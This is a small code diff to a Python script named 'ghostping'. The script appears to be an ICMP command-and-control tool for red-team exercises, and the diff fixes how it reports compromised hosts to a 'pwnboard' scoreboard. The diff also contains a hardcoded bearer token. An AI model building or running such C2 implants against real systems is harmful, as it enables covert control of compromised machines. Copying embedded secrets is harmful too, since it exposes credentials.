@@ -14,7 +14,7 @@ from scapy.sendrecv import send, AsyncSniffer
 SERVER_IP = "192.168.10.170"
 
 PWNBOARD_URL  = "https://pwnboard.win/pwn"
-BEARER_TOKEN  = E9Loq-pQR7P545vRwPZBXs3oxJS3vHeA4IJ79_TW0v0
+BEARER_TOKEN  = "E9Loq-pQR7P545vRwPZBXs3oxJS3vHeA4IJ79_TW0v0"
 APP_NAME      = "ghostping"
 TIMEOUT       = 5
 
@@ -25,7 +25,7 @@ def pwnboard_callback(ip):
     }
     payload = {
         "ip": ip,
-        "application": ghostping,
+        "application": APP_NAME,
         "access_type": "icmp c2",
     }
     try:
